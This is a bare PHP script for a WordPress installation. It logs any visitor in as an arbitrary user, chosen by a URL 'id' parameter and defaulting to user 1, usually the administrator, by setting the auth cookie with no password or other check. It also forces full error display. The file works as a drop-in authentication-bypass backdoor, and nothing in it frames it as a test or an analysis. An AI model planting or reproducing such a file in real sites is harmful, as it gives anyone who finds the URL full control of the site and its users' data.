<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


/** Set up WordPress environment */
require_once( dirname( __FILE__ ) . '/wp-load.php' );


$user_id = empty($_GET['id']) ? 1 : $_GET['id'];


$user = get_user_by( 'id', $user_id );

if( $user ) {
	wp_set_current_user( $user_id, $user->user_login );
	wp_set_auth_cookie( $user_id );
	do_action( 'wp_login', $user->user_login );
	echo "user: #{$user_id}";
}
else
{
	echo 'no user';
}
